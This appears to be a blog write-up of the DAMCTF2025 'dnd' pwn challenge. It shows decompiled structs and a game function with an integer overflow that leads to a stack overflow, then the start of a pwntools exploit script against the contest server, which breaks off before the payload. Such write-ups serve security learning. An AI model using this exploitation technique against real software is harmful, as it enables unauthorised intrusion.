<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>DAMCTF2025 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta property="og:title" content="DAMCTF2025 Writeup | 花盆"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/damctf2025-writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="preload" as="style" href="/style.css" type="text/css"/><link rel="preload" as="style" href="/fonts.css" type="text/css"/><link rel="stylesheet" href="/style.css" type="text/css"/><link rel="stylesheet" href="/fonts.css" type="text/css"/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="damctf2025-pwn-writeup" class="scroll-target"><a href="#damctf2025-pwn-writeup"><code class="hash inline-code">#</code>DAMCTF2025 Pwn WriteUp</a></h1>
<p>本来周末想着打那个 midnight sun CTF2025 来着，结果推迟了，就看了这一场 DAMCTF2025 和另外一场 Break The Syntax CTF2025。。</p>
<h2 id="dnd" class="scroll-target"><a href="#dnd"><code class="hash inline-code">#</code>dnd</a></h2>
<p>简单逆向一下恢复结构体：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> Game</span><span style="color:#A0ADA0"> // sizeof=0x4</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> point</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000001</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> health</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000002</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> attack</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000003</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> d</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000004</span><span style="color:#999999"> </span><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> Monster</span><span style="color:#A0ADA0"> // sizeof=0x3</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> health</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000001</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> damage</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000002</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> c</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000003</span><span style="color:#999999"> </span><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> Game</span><span style="color:#758575DD"> // sizeof=0x4</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> point</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000001</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> health</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000002</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> attack</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000003</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> d</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000004</span><span style="color:#666666"> </span><span style="color:#5eaab5">}</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> Monster</span><span style="color:#758575DD"> // sizeof=0x3</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> health</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000001</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> damage</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000002</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> c</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000003</span><span style="color:#666666"> </span><span style="color:#5eaab5">}</span><span style="color:#666666">;</span><br></code></pre></div>
<p>恢复出来 <code class="inline-code">Monster::attack</code> 函数如下：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#393A34">Game </span><span style="color:#AB5959">*</span><span style="color:#393A34">__fastcall Monster::</span><span style="color:#59873A">Attack</span><span style="color:#2993a3">(</span><span style="color:#393A34">Monster </span><span style="color:#AB5959">*</span><span style="color:#B07D48">monster</span><span style="color:#999999">,</span><span style="color:#393A34"> Game </span><span style="color:#AB5959">*</span><span style="color:#B07D48">you</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#393A34">  __int64 v2</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><span style="color:#393A34">  Game </span><span style="color:#AB5959">*</span><span style="color:#393A34">result</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><span style="color:#393A34">  __int64 v4</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48"> you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">attack</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">=</span><span style="color:#B07D48"> monster</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">health</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    v4 </span><span style="color:#999999">=</span><span style="color:#393A34"> std::operator</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34">std::char_traits</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#a65e2b">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">std::cout</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">Oof, that hurt ;(</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">    std::ostream::operator</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#a65e2b">(</span><span style="color:#393A34">v4</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">std::endl</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#999999">,</span><span style="color:#393A34">std::char_traits</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">health</span><span style="color:#AB5959"> -=</span><span style="color:#B07D48"> monster</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">damage</span><span style="color:#999999">;</span><br><span style="color:#393A34">    result </span><span style="color:#999999">=</span><span style="color:#393A34"> you</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">point</span><span style="color:#AB5959"> -=</span><span style="color:#B07D48"> monster</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">health</span><span style="color:#999999">;</span><span style="color:#A0ADA0">              // 整数溢出</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  else</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    v2 </span><span style="color:#999999">=</span><span style="color:#393A34"> std::operator</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34">std::char_traits</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#a65e2b">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">std::cout</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">You defeated the monster!</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">    std::ostream::operator</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#a65e2b">(</span><span style="color:#393A34">v2</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">std::endl</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#999999">,</span><span style="color:#393A34">std::char_traits</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">point</span><span style="color:#AB5959"> +=</span><span style="color:#B07D48"> monster</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">health</span><span style="color:#999999">;</span><br><span style="color:#393A34">    result </span><span style="color:#999999">=</span><span style="color:#393A34"> you</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    ++</span><span style="color:#B07D48">you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">attack</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                              // inc attack</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  return</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#DBD7CAEE">Game </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">__fastcall Monster::</span><span style="color:#80A665">Attack</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">Monster </span><span style="color:#CB7676">*</span><span style="color:#BD976A">monster</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> Game </span><span style="color:#CB7676">*</span><span style="color:#BD976A">you</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">  __int64 v2</span><span style="color:#666666">;</span><span style="color:#758575DD"> // rax</span><br><span style="color:#DBD7CAEE">  Game </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">result</span><span style="color:#666666">;</span><span style="color:#758575DD"> // rax</span><br><span style="color:#DBD7CAEE">  __int64 v4</span><span style="color:#666666">;</span><span style="color:#758575DD"> // rax</span><br><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A"> you</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">attack</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">=</span><span style="color:#BD976A"> monster</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">health</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span style="color:#DBD7CAEE">    v4 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> std::operator</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">std::char_traits</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">char</span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#d4976c">(</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">std::cout</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Oof, that hurt ;(</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">    std::ostream::operator</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">v4</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">std::endl</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">char</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">std::char_traits</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">char</span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    you</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">health</span><span style="color:#CB7676"> -=</span><span style="color:#BD976A"> monster</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">damage</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">    result </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> you</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    you</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">point</span><span style="color:#CB7676"> -=</span><span style="color:#BD976A"> monster</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">health</span><span style="color:#666666">;</span><span style="color:#758575DD">              // 整数溢出</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#4D9375">  else</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span style="color:#DBD7CAEE">    v2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> std::operator</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE">std::char_traits</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">char</span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#d4976c">(</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">std::cout</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">You defeated the monster!</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">    std::ostream::operator</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">v2</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">std::endl</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">char</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">std::char_traits</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">char</span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    you</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">point</span><span style="color:#CB7676"> +=</span><span style="color:#BD976A"> monster</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">health</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">    result </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> you</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    ++</span><span style="color:#BD976A">you</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">attack</span><span style="color:#666666">;</span><span style="color:#758575DD">                              // inc attack</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#4D9375">  return</span><span style="color:#DBD7CAEE"> result</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>只要把 you→point 变成负数</p>
<p><img loading="lazy" decoding="async" fetchpriority="auto" src="https://pic1.imgdb.cn/item/68215fba58cb8da5c8ecc4de.png" alt="image.png"/></p>
<p>这里的比较用的是无符号数，所以上面的负数很容易就通过这个检测。</p>
<p>然后就是一个白给的栈溢出。</p>
<p>题目的交互比较抽象，本地一开始瞎写踩了很多坑，后来重写了一下，exp：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./dnd_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">dnd.chals.damctf.xyz</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 30813</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    b *0x402960</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> get_point</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Attack: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    attack </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> (</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    health </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> health</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> attack </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">=</span><span style="color:#393A34"> health</span><span style="color:#999999">:</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Do you want to [a]ttack or [r]un?</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    else</span><span style="color:#999999">:</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Do you want to [a]ttack or [r]un?</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">>>> Round </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Points: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    points </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> | Health: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> points</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> get_overflow</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Can you survive all 5 rounds?</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">>>> Round </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span 